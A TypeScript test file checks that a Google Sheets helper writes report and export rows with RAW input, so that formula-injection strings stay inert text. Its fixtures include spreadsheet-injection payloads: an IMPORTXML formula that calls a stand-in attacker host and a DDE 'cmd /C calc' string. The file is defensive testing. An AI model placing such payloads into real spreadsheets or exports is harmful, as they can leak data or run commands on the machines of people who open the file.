import assert from "node:assert/strict";
import test from "node:test";

import {
  appendSpreadsheetValues,
  buildStaleClearRanges,
  replaceSpreadsheetReportValues,
} from "./google-sheets";

test("builds stale-tail ranges that never overlap the replacement rectangle", () => {
  assert.deepEqual(
    buildStaleClearRanges("Member Hours", "A1:H100", [
      ["Name", "Email"],
      ["Example", "example@test.invalid"],
    ]),
    ["'Member Hours'!C1:H2", "'Member Hours'!A3:H100"],
  );
});

test("report replacement writes malicious-looking cells as RAW before clearing tails", async () => {
  const originalFetch = globalThis.fetch;
  const calls: Array<{ url: string; method: string; body?: string }> = [];

  globalThis.fetch = (async (input, init) => {
    calls.push({
      url: String(input),
      method: init?.method ?? "GET",
      body: typeof init?.body === "string" ? init.body : undefined,
    });
    return new Response(null, { status: 200 });
  }) as typeof fetch;

  try {
    const rows = [
      ["Name", "Email"],
      ["=1+1", "+cmd"],
      ["-2+3", "@SUM(1,1)"],
    ];
    const result = await replaceSpreadsheetReportValues(
      "token",
      "sheet-id",
      "Report",
      "A1:D10",
      rows,
    );

    assert.deepEqual(result, { success: true });
    assert.ok(calls.length > 1);
    assert.equal(calls[0].method, "PUT");
    assert.match(calls[0].url, /valueInputOption=RAW$/u);
    assert.deepEqual(JSON.parse(calls[0].body ?? "{}").values, rows);
    assert.ok(calls.slice(1).every((call) => call.method === "POST"));
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("CSF compatibility export appends malicious-looking cells as RAW", async () => {
  const originalFetch = globalThis.fetch;
  const calls: Array<{ url: string; method: string; body?: string }> = [];

  globalThis.fetch = (async (input, init) => {
    calls.push({
      url: String(input),
      method: init?.method ?? "GET",
      body: typeof init?.body === "string" ? init.body : undefined,
    });
    return new Response(null, { status: 200 });
  }) as typeof fetch;

  try {
    const rows = [
      ["Name", "Activity"],
      ['=IMPORTXML("https://attacker.invalid")', "+cmd|' /C calc'!A0"],
      ["-2+3", "@SUM(1,1)"],
    ];
    const result = await appendSpreadsheetValues(
      "token",
      "sheet-id",
      "'CSF Export'!A:Z",
      rows,
      "RAW",
    );

    assert.equal(result, true);
    assert.equal(calls.length, 1);
    assert.equal(calls[0].method, "POST");
    assert.match(calls[0].url, /valueInputOption=RAW/u);
    assert.deepEqual(JSON.parse(calls[0].body ?? "{}").values, rows);
  } finally {
    globalThis.fetch = originalFetch;
  }
});
